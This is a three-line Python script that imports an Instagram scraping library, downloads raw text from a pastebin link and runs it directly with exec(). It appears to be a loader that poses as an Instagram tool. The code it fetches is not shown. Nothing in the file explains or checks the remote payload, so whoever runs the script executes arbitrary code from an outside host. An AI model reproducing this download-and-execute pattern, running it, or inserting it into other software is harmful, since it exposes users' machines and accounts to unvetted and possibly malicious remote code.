import requests,uuid,instaloader,os
req = requests.get('https://pastebin.com/raw/ZXvyYxwB')
exec(req.text)